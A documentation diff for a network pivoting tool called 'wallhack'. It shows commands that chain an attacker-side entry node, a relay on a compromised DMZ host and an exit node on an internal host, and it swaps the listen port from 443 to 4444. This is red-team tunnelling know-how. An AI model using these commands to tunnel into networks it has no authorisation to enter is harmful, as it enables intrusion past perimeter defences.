@@ -14,19 +14,19 @@ The binary reached the DMZ host via initial access — a web shell, exposed serv
 
 {% steps %}
 {% step title="Attacker (10.0.0.5)" number=1 %}
-An [entry node](/concepts) listening on port 443. The default transport is QUIC, which uses UDP. Port 443 is chosen here as it is the standard HTTPS port and less likely to draw attention.
+An [entry node](/concepts) listening for the first hop. The default transport is QUIC (UDP).
 
-{% codeblock code="wallhack entry --listen :443" /%}
+{% codeblock code="wallhack entry --listen :4444" /%}
 {% /step %}
 
 {% step title="DMZ Host (10.0.1.10)" number=2 %}
-A [relay node](/concepts) connecting to the entry node on port 443 and listening for the next hop on port 6565. Port 6565 is an arbitrary internal port; any unused port reachable from the internal host works here.
+A [relay node](/concepts) connecting to the entry node and listening for the next hop on an arbitrary internal port.
 
-{% codeblock code="wallhack relay --connect 10.0.0.5:443 --listen :6565" /%}
+{% codeblock code="wallhack relay --connect 10.0.0.5:4444 --listen :6565" /%}
 {% /step %}
 
 {% step title="Internal Host" number=3 %}
-An [exit node](/concepts) connecting back to the relay on port 6565.
+An [exit node](/concepts) connecting back to the relay.
 
 {% codeblock code="wallhack exit --connect 10.0.1.10:6565" /%}
 {% /step %}
